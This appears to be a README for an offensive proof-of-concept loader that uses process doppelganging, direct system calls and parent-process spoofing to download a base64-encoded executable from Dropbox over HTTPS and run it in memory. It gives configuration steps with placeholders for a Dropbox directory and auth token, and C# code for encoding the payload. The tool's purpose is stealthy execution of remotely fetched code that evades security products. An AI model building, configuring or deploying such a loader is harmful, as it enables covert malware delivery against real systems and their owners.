# ProcessDoppelganging

Process doppelganging POC using direct system calls, PPID spoofing and HTTPS sockets as an external delivery channel to download the payload directly into memory. As a POC, dropbox is used to deliver the payload but this can me easily modified.

If you wish to use dropbox, just change the following parameters at main.cpp and you are good to go.

```
std::string encoded = Read(ssl, "<FILE>", project, token);
...
Run("<DROPBOX DIRECTORY>", "<AUTH TOKEN>");
```

Payload has to be a base64 encoded executable file, I use the following c# code to generate the payloads:

```C#
byte[] data = File.ReadAllBytes(@"C:\Path\to\file.exe");
string payload = Convert.ToBase64String(data);

File.WriteAllText("payload.txt", payload);
```
